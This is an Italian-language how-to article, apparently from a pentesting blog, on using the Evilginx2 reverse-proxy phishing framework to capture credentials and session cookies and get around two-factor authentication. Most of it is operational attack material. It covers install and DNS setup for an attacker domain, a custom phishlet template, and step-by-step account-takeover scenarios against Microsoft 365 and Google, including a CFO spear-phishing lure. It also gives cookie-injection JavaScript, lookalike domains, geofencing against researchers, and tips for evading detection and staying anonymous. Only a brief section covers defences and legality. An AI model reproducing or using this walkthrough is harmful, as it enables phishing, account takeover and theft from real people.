---
title: 'Evilginx2: Bypass 2FA con Phishing Proxy Man-in-the-Middle'
slug: evilginx2
description: 'Guida pratica Evilginx2 per bypass autenticazione 2FA: man-in-the-middle phishing, session hijacking e credential theft. Attacchi avanzati contro MFA.'
image: /Gemini_Generated_Image_rgx63lrgx63lrgx6.webp
draft: true
date: 2026-02-11T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - phising
---

Evilginx2 è un framework di attacco che agisce come reverse proxy tra la vittima e il sito legittimo, permettendo di catturare credenziali E session token in tempo reale. A differenza del phishing tradizionale, Evilginx2 bypassa completamente l'autenticazione a due fattori intercettando la sessione autenticata. In questa guida impari a configurare phishlet, deployare campagne e bypassare 2FA su target come Microsoft 365, Google e altri.

## Posizione nella Kill Chain

Evilginx2 opera nella fase di Initial Access e Credential Access, specializzandosi nel bypass di controlli MFA:

| Fase              | Tool Precedente                                                 | Evilginx2               | Tool Successivo     |
| ----------------- | --------------------------------------------------------------- | ----------------------- | ------------------- |
| Recon             | [TheHarvester](https://hackita.it/articoli/theharvester) emails | → Target identification | → Phishlet config   |
| Initial Access    | Domain setup                                                    | → Proxy phishing        | → Session capture   |
| Credential Access | Victim login                                                    | → 2FA bypass            | → Account takeover  |
| Persistence       | Session token                                                   | → Cookie injection      | → Persistent access |

## Come Funziona

Il flusso di attacco Evilginx2:

1. **Vittima clicca link** phishing (es. `login.microsoft.com.attacker.com`)
2. **Evilginx2 proxy** la richiesta al sito reale
3. **Vittima inserisce credenziali** → catturate da Evilginx
4. **Vittima completa 2FA** → session token catturato
5. **Attacker ha session cookie** valido → accesso senza 2FA

## Installazione e Setup

### Requisiti

* VPS con IP pubblico
* Dominio con accesso DNS (per certificati Let's Encrypt)
* Go 1.14+

### Installazione

```bash
# Installa Go se necessario
sudo apt install golang-go -y

# Clone e build
git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx2
cd /opt/evilginx2
make
```

### Configurazione DNS

Per il dominio `attacker.com`, crea record DNS:

```
A    @           → YOUR_VPS_IP
A    *           → YOUR_VPS_IP
NS   phish       → ns1.attacker.com
```

### Primo Avvio

```bash
cd /opt/evilginx2
sudo ./bin/evilginx -p ./phishlets
```

Output atteso:

```
evilginx2 [2.4.0] by @mrgretzky
[inf] loading phishlets from: ./phishlets/
[inf] loading configuration from: /root/.evilginx
[inf] evilginx2 started
: 
```

## Configurazione Base

### Setup Dominio e IP

```
config domain attacker.com
config ip YOUR_VPS_IP
```

### Setup Phishlet

I phishlet sono template per siti specifici. Esempio Microsoft 365:

```
phishlets hostname o365 login.attacker.com
phishlets enable o365
```

Output:

```
[inf] setting up phishlet 'o365' hostname to: login.attacker.com
[inf] enabled phishlet 'o365'
```

### Genera Certificato SSL

```
phishlets get-url o365
```

Evilginx richiede automaticamente certificato Let's Encrypt.

### Crea Lure (URL di Phishing)

```
lures create o365
lures get-url 0
```

Output:

```
https://login.attacker.com/HjK2m8Ql
```

Questo è l'URL da inviare alla vittima.

## Phishlet Disponibili

Evilginx include phishlet per target comuni:

| Phishlet  | Target           | 2FA Bypass |
| --------- | ---------------- | ---------- |
| o365      | Microsoft 365    | ✓          |
| google    | Google Workspace | ✓          |
| linkedin  | LinkedIn         | ✓          |
| twitter   | Twitter/X        | ✓          |
| instagram | Instagram        | ✓          |
| github    | GitHub           | ✓          |
| okta      | Okta SSO         | ✓          |
| onelogin  | OneLogin         | ✓          |

### Creare Phishlet Custom

Per target non inclusi, crea phishlet YAML:

```yaml
name: 'custom_app'
author: '@yourusername'
min_ver: '2.4.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'target.com', session: true, is_landing: true}
sub_filters:
  - {triggers_on: 'login.target.com', orig_sub: 'login', domain: 'target.com', search: 'target.com', replace: 'attacker.com', mimes: ['text/html', 'application/javascript']}
auth_tokens:
  - domain: '.target.com'
    keys: ['session_id', 'auth_token']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
```

## Scenari Pratici di Penetration Test

### Scenario 1: Microsoft 365 Account Takeover

**Timeline stimata: 30 minuti setup + tempo phishing**

```bash
# COMANDO: Configura Evilginx
sudo ./bin/evilginx -p ./phishlets

: config domain evil-corp.com
: config ip 203.0.113.50
: phishlets hostname o365 login.evil-corp.com
: phishlets enable o365
```

## OUTPUT ATTESO

```
[inf] setting up phishlet 'o365' hostname to: login.evil-corp.com
[inf] enabled phishlet 'o365'
[inf] setting up certificates for: login.evil-corp.com
[inf] successfully obtained letsencrypt certificate
```

```bash
# COMANDO: Crea lure
: lures create o365
: lures edit redirect_url 0 https://office.com
: lures get-url 0
```

## OUTPUT ATTESO

```
https://login.evil-corp.com/ABc123xY
```

```bash
# COMANDO: Monitora sessioni
: sessions
```

## OUTPUT ATTESO (dopo che vittima logga)

```
[ses] 2024-01-15 14:32:05 | o365 | id: 1 | 192.168.1.100 | captured
[cre] email: victim@company.com
[cre] password: VictimPass123!
[tok] ESTSAUTHPERSISTENT=...
[tok] ESTSAUTH=...
```

### COSA FARE SE FALLISCE

* **Certificato fallisce**: DNS non propagato. Attendi o verifica record.
* **Victim vede errore SSL**: Dominio blacklistato. Usa nuovo dominio.
* **Session non catturata**: Phishlet outdated. Aggiorna o crea custom.

### Scenario 2: Google Workspace Compromise

**Timeline stimata: 25 minuti**

```bash
# COMANDO: Setup Google phishlet
: phishlets hostname google accounts.evil-corp.com
: phishlets enable google
: lures create google
: lures get-url 0
```

### Scenario 3: Targeted Spear Phishing con Custom Redirect

```bash
# COMANDO: Lure personalizzato per target specifico
: lures create o365
: lures edit redirect_url 0 https://sharepoint.company.com/documents
: lures edit info 0 "CFO target - Q4 report"
: lures get-url 0
```

La vittima dopo il login viene rediretta a pagina SharePoint legittima, riducendo sospetti.

### Scenario 4: Session Hijacking Post-Capture

Una volta catturato il session token:

```bash
# COMANDO: Esporta cookies
: sessions 1
```

## OUTPUT ATTESO

```
[tok] cookies:
      ESTSAUTHPERSISTENT: eyJ0eXAiOiJKV1Qi...
      ESTSAUTH: 0.AS0A...
```

Importa in browser con extension EditThisCookie o via DevTools:

```javascript
// In console browser
document.cookie = "ESTSAUTHPERSISTENT=eyJ0eXAi...; domain=.microsoft.com; path=/";
document.cookie = "ESTSAUTH=0.AS0A...; domain=.login.microsoftonline.com; path=/";
```

Naviga a `https://portal.office.com` → accesso diretto senza credenziali o 2FA.

## Defense Evasion

### Tecnica 1: Dominio Lookalike

Registra domini simili al target:

```
microsoft-login.com
microsft-online.com
login-microsoft365.com
```

### Tecnica 2: Blacklist Evasion

Usa dominio fresh, mai usato prima per phishing:

```bash
# Verifica dominio non sia blacklistato
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=KEY&domain=evil-corp.com"
```

### Tecnica 3: Geofencing

Limita accesso al phishing solo a IP del target:

```
lures edit geoip 0 US,IT
```

Blocca scanner e ricercatori da altri paesi.

## Integration Matrix

| Evilginx2 +                                                    | Risultato               | Workflow                                  |
| -------------------------------------------------------------- | ----------------------- | ----------------------------------------- |
| [Gophish](https://hackita.it/articoli/gophish)                 | Mass phishing campaigns | Gophish email delivery → Evilginx landing |
| [BeEF](https://hackita.it/articoli/beef)                       | Post-login hooking      | Evilginx capture → BeEF hook inject       |
| [Maltego](https://hackita.it/articoli/maltego)                 | Target reconnaissance   | Maltego OSINT → Evilginx targeting        |
| [Metasploit](https://hackita.it/articoli/metasploit-framework) | Post-compromise         | Session token → MSF browser exploitation  |

## Confronto: Evilginx2 vs Alternative

| Feature         | Evilginx2 | Modlishka | GoPhish | King Phisher |
| --------------- | --------- | --------- | ------- | ------------ |
| 2FA Bypass      | ✓         | ✓         | ✗       | ✗            |
| Session Capture | ✓         | ✓         | ✗       | ✗            |
| SSL Auto        | ✓         | ✗         | ✓       | ✓            |
| Phishlets       | 20+       | Limitati  | N/A     | N/A          |
| API             | Limitata  | Limitata  | ✓       | ✓            |

**Quando usare Evilginx2**: target ha MFA, serve bypass 2FA, account high-value.

**Quando usare alternative**: non serve 2FA bypass, campagne mass-scale.

## Detection e Countermeasures

### Cosa Cerca il Blue Team

* Login da IP/location insoliti immediatamente dopo da altro IP
* User-Agent mismatch tra sessioni
* Referrer da domini sospetti
* Timing anomalo (login 2FA completato troppo velocemente)

### Evasion Tips

1. **Usa VPN/proxy** vicino geograficamente alla vittima
2. **Mantieni User-Agent** consistente quando usi session cookie
3. **Non fare azioni aggressive** subito dopo takeover

### Protezioni Efficaci

* **Token binding** (lega session a device)
* **FIDO2/WebAuthn** (hardware keys non phishable)
* **Conditional Access** avanzato

## Troubleshooting

### Certificato Let's Encrypt Fallisce

```
[err] could not obtain letsencrypt certificate
```

Verifica:

* DNS A record punta a VPS
* Porta 80 non bloccata
* Rate limit non raggiunto

### Phishlet Non Cattura Credenziali

Phishlet potrebbe essere outdated:

```bash
# Verifica log
: debug
```

Cerca errori JavaScript o redirect loop.

### Session Token Non Funziona

Token potrebbe essere expired o vincolato:

```bash
# Usa token immediatamente dopo cattura
# Verifica di aver catturato TUTTI i cookie necessari
```

### Dominio Blacklistato

```bash
# Verifica
curl -I https://login.evil-corp.com
# Se timeout, potrebbe essere blacklist browser
```

Usa dominio nuovo.

## Cheat Sheet Comandi

| Operazione          | Comando                              |
| ------------------- | ------------------------------------ |
| Config dominio      | `config domain DOMAIN`               |
| Config IP           | `config ip IP`                       |
| Setup phishlet      | `phishlets hostname NAME SUB.DOMAIN` |
| Abilita phishlet    | `phishlets enable NAME`              |
| Crea lure           | `lures create NAME`                  |
| Get URL lure        | `lures get-url ID`                   |
| Edit redirect       | `lures edit redirect_url ID URL`     |
| Lista sessioni      | `sessions`                           |
| Dettagli sessione   | `sessions ID`                        |
| Disabilita phishlet | `phishlets disable NAME`             |
| Debug mode          | `debug`                              |

## FAQ

**Evilginx2 bypassa tutti i 2FA?**

Bypass SMS, TOTP, push notification. NON bypassa hardware key FIDO2/WebAuthn.

**Quanto dura il session token catturato?**

Dipende dal target. Microsoft 365: ore/giorni. Alcuni servizi: minuti. Usa subito.

**Posso usare Evilginx2 con IP dinamico?**

Sì, ma i certificati Let's Encrypt richiedono che l'IP sia raggiungibile. Usa Dynamic DNS.

**La vittima si accorge dell'attacco?**

Se fatto bene, no. Vede URL leggermente diverso e login normale. Post-login redirect a pagina attesa.

**Come evito di essere tracciato?**

VPS anonimo, pagamento crypto, dominio con privacy WHOIS. Per test autorizzati usa la tua infrastruttura.

**È legale usare Evilginx2?**

Solo con autorizzazione scritta esplicita. Usalo solo in test autorizzati con consenso scritto, niente giochetti fuori scope — lì si finisce nei guai seri.

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [Evilginx2 GitHub](https://github.com/kgretzky/evilginx2) | [Kgretzky Blog](https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens/)
